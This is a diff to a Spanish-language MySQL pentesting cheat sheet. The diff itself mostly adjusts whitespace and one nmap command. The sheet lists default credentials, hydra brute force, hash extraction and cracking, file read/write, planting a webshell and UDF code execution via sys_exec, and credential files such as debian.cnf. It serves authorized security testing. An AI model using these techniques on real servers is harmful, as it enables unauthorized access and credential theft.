@@ -31,8 +31,9 @@ Credenciales por defecto que valen probar: `root:(vacía)`, `root:root`, `root:t
 
 | Comando | Qué da |
 |---|---|
-| `nmap -sV --script "mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables" -p3306 HOST` | Versión, cuentas sin contraseña, usuarios, bases y variables |
+| `nmap -sV --script 'mysql*' -p3306 HOST` | Versión, cuentas sin contraseña, usuarios, bases y variables |
 | `hydra -L users.txt -P pass.txt HOST mysql` | Fuerza bruta de credenciales |
+
 
 ## Enumerar (dentro de la sesión)
 
@@ -48,7 +49,6 @@ Credenciales por defecto que valen probar: `root:(vacía)`, `root:root`, `root:t
 `mysql.user` requiere leer la base `mysql` (admin). Los hashes que saca se crackean con hashcat (modo `300` para MySQL 4.1+).
 
 ## Leer y escribir archivos
-
 Requiere el privilegio **`FILE`** y que **`secure_file_priv`** lo permita (vacío = cualquier ruta; una ruta = solo ahí; `NULL` = deshabilitado).
 
 | Tarea | SQL |
@@ -60,9 +60,7 @@ Requiere el privilegio **`FILE`** y que **`secure_file_priv`** lo permita (vací
 Escribir una webshell al webroot es **RCE** — el caso de mayor impacto del servicio. `OUTFILE` agrega saltos de línea; para binarios usar `DUMPFILE`.
 
 ## RCE por UDF
-
 Con `FILE` y un `plugin_dir` escribible: subir `lib_mysqludf_sys` con `DUMPFILE`, crear la función y ejecutar.
-
 `CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';` → `SELECT sys_exec('id > /tmp/o');`
 
 ## Configuración (con acceso al host)
@@ -74,6 +72,7 @@ Con `FILE` y un `plugin_dir` escribible: subir `lib_mysqludf_sys` con `DUMPFILE`
 | `/etc/mysql/debian.cnf` | En Debian, credenciales del usuario `debian-sys-maint` (casi root) |
 | `<datadir>/mysql/` | Los archivos de la base — hashes incluidos |
 
+
 ### Configuraciones peligrosas
 
 | Config | Por qué importa |
@@ -83,6 +82,7 @@ Con `FILE` y un `plugin_dir` escribible: subir `lib_mysqludf_sys` con `DUMPFILE`
 | `skip-grant-tables` | Arranca sin autenticación: cualquiera entra como root |
 | `bind-address = 0.0.0.0` | El 3306 escucha en toda interfaz, no solo local |
 
+
 ## Errores frecuentes
 
 | Síntoma | Causa | Salida |
@@ -91,3 +91,4 @@ Con `FILE` y un `plugin_dir` escribible: subir `lib_mysqludf_sys` con `DUMPFILE`
 | `The MySQL server is running with the --secure-file-priv` | `OUTFILE` restringido | escribir solo en la ruta permitida (ver `@@secure_file_priv`) |
 | `ERROR 1290` al `LOAD_FILE` | sin privilegio `FILE` o ruta fuera de `secure_file_priv` | `SHOW GRANTS`, ajustar ruta |
 | `Host ... is not allowed to connect` | el server filtra por origen | pivotar, o usar una IP permitida |
+
